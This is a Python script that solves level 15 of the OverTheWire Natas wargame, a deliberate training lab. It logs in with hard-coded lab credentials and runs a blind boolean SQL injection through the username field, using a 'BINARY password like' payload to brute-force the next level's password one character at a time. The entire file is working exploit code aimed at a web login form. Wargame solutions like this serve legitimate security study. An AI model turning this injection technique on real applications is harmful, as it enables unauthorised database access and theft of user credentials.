#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re
import string

#Declaring the Authentication
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.Session()
characters = string.ascii_letters + string.digits
seen_password = list()

#Using Wile Loop for Brute Forcing
while (len(seen_password) < 32):
	for ch in characters:
		print("Trying the character to match the Password with:", "".join(seen_password) + ch)

		response = session.post(url, auth = (username, password), data = {"username" : 'natas16" AND BINARY password like "'+ "".join(seen_password) + ch +'%" #' })

		content = response.text

		if('user exists' in content):
			seen_password.append(ch)
			break
